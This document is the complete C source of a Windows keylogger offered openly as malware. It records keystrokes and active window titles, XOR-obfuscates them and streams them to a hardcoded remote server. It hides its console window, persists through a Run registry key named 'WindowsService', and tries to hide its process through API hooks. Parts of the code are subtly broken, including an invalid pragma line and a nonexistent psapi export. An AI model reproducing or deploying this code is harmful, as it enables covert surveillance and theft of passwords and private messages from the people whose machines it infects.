#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <winreg.h>
#include <shlobj.h>
#include <psapi.h>
#include "MinHook.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "MinHook.x64.lib" or "MinHook.x86.lib") // Choose based on your architecture

#define SERVER_IP "192.168.1.64"
#define SERVER_PORT 8080
#define RECONNECT_DELAY 10000
#define SERVICE_NAME "WindowsService"
#define ENCRYPTION_KEY "S3cr3tK3y"
#define MAX_BUFFER 1024

// Function prototypes for hooked functions
typedef BOOL (WINAPI *ENUMPROCESSES)(DWORD *, DWORD, DWORD *);
typedef BOOL (WINAPI *ENUMPROCESSEX)(DWORD *, DWORD, DWORD *);
typedef DWORD (WINAPI *GETMODULEBASENAME)(HANDLE, HMODULE, LPTSTR, DWORD);

// Original functions
ENUMPROCESSES fpEnumProcesses = NULL;
ENUMPROCESSEX fpEnumProcessesEx = NULL;
GETMODULEBASENAME fpGetModuleBaseName = NULL;

// Our process ID to hide
DWORD g_dwProcessId = 0;

// Hooked functions
BOOL WINAPI DetourEnumProcesses(DWORD *lpidProcess, DWORD cb, DWORD *lpcbNeeded)
{
    BOOL result = fpEnumProcesses(lpidProcess, cb, lpcbNeeded);
    if (result && lpidProcess && g_dwProcessId) {
        DWORD count = *lpcbNeeded / sizeof(DWORD);
        for (DWORD i = 0; i < count; i++) {
            if (lpidProcess[i] == g_dwProcessId) {
                // Remove our process ID from the list
                memmove(&lpidProcess[i], &lpidProcess[i + 1], (count - i - 1) * sizeof(DWORD));
                *lpcbNeeded -= sizeof(DWORD);
                break;
            }
        }
    }
    return result;
}

BOOL WINAPI DetourEnumProcessesEx(DWORD *lpidProcess, DWORD cb, DWORD *lpcbNeeded)
{
    BOOL result = fpEnumProcessesEx(lpidProcess, cb, lpcbNeeded);
    if (result && lpidProcess && g_dwProcessId) {
        DWORD count = *lpcbNeeded / sizeof(DWORD);
        for (DWORD i = 0; i < count; i++) {
            if (lpidProcess[i] == g_dwProcessId) {
                // Remove our process ID from the list
                memmove(&lpidProcess[i], &lpidProcess[i + 1], (count - i - 1) * sizeof(DWORD));
                *lpcbNeeded -= sizeof(DWORD);
                break;
            }
        }
    }
    return result;
}

DWORD WINAPI DetourGetModuleBaseName(HANDLE hProcess, HMODULE hModule, LPTSTR lpBaseName, DWORD nSize)
{
    DWORD result = fpGetModuleBaseName(hProcess, hModule, lpBaseName, nSize);
    
    if (hProcess != NULL) {
        DWORD dwProcessId = GetProcessId(hProcess);
        if (dwProcessId == g_dwProcessId) {
            // Return empty string for our process
            if (nSize > 0) {
                lpBaseName[0] = '\0';
            }
            return 0;
        }
    }
    
    return result;
}

// Initialize MinHook hooks
BOOL InitializeHooks()
{
    g_dwProcessId = GetCurrentProcessId();
    
    if (MH_Initialize() != MH_OK) {
        return FALSE;
    }
    
    // Hook EnumProcesses
    if (MH_CreateHook(&EnumProcesses, &DetourEnumProcesses, (LPVOID*)&fpEnumProcesses) != MH_OK) {
        return FALSE;
    }
    
    // Hook EnumProcessesEx if available (Windows 8+)
    HMODULE hPsapi = GetModuleHandle("psapi.dll");
    if (hPsapi) {
        FARPROC pEnumProcessesEx = GetProcAddress(hPsapi, "EnumProcessesEx");
        if (pEnumProcessesEx) {
            if (MH_CreateHook(pEnumProcessesEx, &DetourEnumProcessesEx, (LPVOID*)&fpEnumProcessesEx) != MH_OK) {
                return FALSE;
            }
        }
    }
    
    // Hook GetModuleBaseName
    if (MH_CreateHook(&GetModuleBaseNameA, &DetourGetModuleBaseName, (LPVOID*)&fpGetModuleBaseName) != MH_OK) {
        return FALSE;
    }
    
    // Enable all hooks
    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK) {
        return FALSE;
    }
    
    return TRUE;
}

void xor_encrypt(char *data) {
    int key_len = strlen(ENCRYPTION_KEY);
    int data_len = strlen(data);
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ ENCRYPTION_KEY[i % key_len];
    }
}

SOCKET connect_to_server() {
    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return INVALID_SOCKET;
    }

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        WSACleanup();
        return INVALID_SOCKET;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return INVALID_SOCKET;
    }

    return sock;
}

void send_window_title(SOCKET sock) {
    char title[256];
    HWND foreground = GetForegroundWindow();

    if (foreground) {
        GetWindowText(foreground, title, sizeof(title));

        static char last_title[256] = "";
        if (strcmp(last_title, title) != 0) {
            char buffer[512];
            sprintf(buffer, "\n[Window: %s]\n", title);
            
            xor_encrypt(buffer);
            send(sock, buffer, strlen(buffer), 0);
            
            strcpy(last_title, title);
        }
    }
}

void install_persistence() {
    char path[MAX_PATH];
    HMODULE hModule = GetModuleHandle(NULL);
    GetModuleFileName(hModule, path, MAX_PATH);

    // Registry persistence
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, SERVICE_NAME, 0, REG_SZ, (BYTE*)path, strlen(path)+1);
        RegCloseKey(hKey);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Initialize process hiding
    if (!InitializeHooks()) {
        // Hiding failed, but continue anyway
    }
    
    // Hide console window if it exists
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
    }
    
    // Set process priority
    SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
    
    // Install persistence
    install_persistence();

    SOCKET sock;
    static bool key_states[256] = {0};

    while (1) {
        sock = connect_to_server();
        
        if (sock != INVALID_SOCKET) {
            while (1) {
                send_window_title(sock);

                for (int key = 8; key <= 190; key++) {
                    if ((GetAsyncKeyState(key) & 0x8000) && !key_states[key]) {
                        char key_str[20] = {0};

                        if (key >= 65 && key <= 90) {
                            sprintf(key_str, "%c", key + 32);
                        } else if (key >= 48 && key <= 57) {
                            sprintf(key_str, "%c", key);
                        } else {
                            switch (key) {
                                case VK_SPACE: strcpy(key_str, " "); break;
                                case VK_RETURN: strcpy(key_str, "[ENTER]\n"); break;
                                case VK_TAB: strcpy(key_str, "[TAB]"); break;
                                case VK_SHIFT: strcpy(key_str, "[SHIFT]"); break;
                                case VK_BACK: strcpy(key_str, "\b"); break;
                                case VK_ESCAPE: strcpy(key_str, "[ESC]"); break;
                                case VK_CONTROL: strcpy(key_str, "[CTRL]"); break;
                                case VK_LWIN: case VK_RWIN: strcpy(key_str, "[WIN]"); break;
                                case VK_MENU: strcpy(key_str, "[ALT]"); break;
                                case VK_CAPITAL: strcpy(key_str, "[CAPSLOCK]"); break;
                                case VK_DELETE: strcpy(key_str, "[DELETE]"); break;
                                case VK_INSERT: strcpy(key_str, "[INSERT]"); break;
                                case VK_HOME: strcpy(key_str, "[HOME]"); break;
                                case VK_END: strcpy(key_str, "[END]"); break;
                                case VK_LEFT: strcpy(key_str, "[LEFT]"); break;
                                case VK_RIGHT: strcpy(key_str, "[RIGHT]"); break;
                                case VK_UP: strcpy(key_str, "[UP]"); break;
                                case VK_DOWN: strcpy(key_str, "[DOWN]"); break;
                                case VK_OEM_1: strcpy(key_str, ";"); break;
                                case VK_OEM_7: strcpy(key_str, "'"); break;
                                case VK_OEM_COMMA: strcpy(key_str, ","); break;
                                case VK_OEM_PERIOD: strcpy(key_str, "."); break;
                                case VK_OEM_MINUS: strcpy(key_str, "-"); break;
                                case VK_OEM_PLUS: strcpy(key_str, "+"); break;
                                case VK_OEM_2: strcpy(key_str, "/"); break;
                                case VK_OEM_3: strcpy(key_str, "`"); break;
                                case VK_OEM_4: strcpy(key_str, "["); break;
                                case VK_OEM_5: strcpy(key_str, "\\"); break;
                                case VK_OEM_6: strcpy(key_str, "]"); break;
                                default: continue;
                            }
                        }

                        xor_encrypt(key_str);
                        if (send(sock, key_str, strlen(key_str), 0) == SOCKET_ERROR) {
                            closesocket(sock);
                            WSACleanup();
                            sock = INVALID_SOCKET;
                            break;
                        }

                        key_states[key] = true;
                    }
                    if (!(GetAsyncKeyState(key) & 0x8000)) {
                        key_states[key] = false;
                    }
                }
                
                if (sock == INVALID_SOCKET) {
                    break;
                }
                
                Sleep(10);
            }
        }

        Sleep(RECONNECT_DELAY);
    }

    // Clean up hooks before exiting
    MH_DisableHook(MH_ALL_HOOKS);
    MH_Uninitialize();

    return 0;
}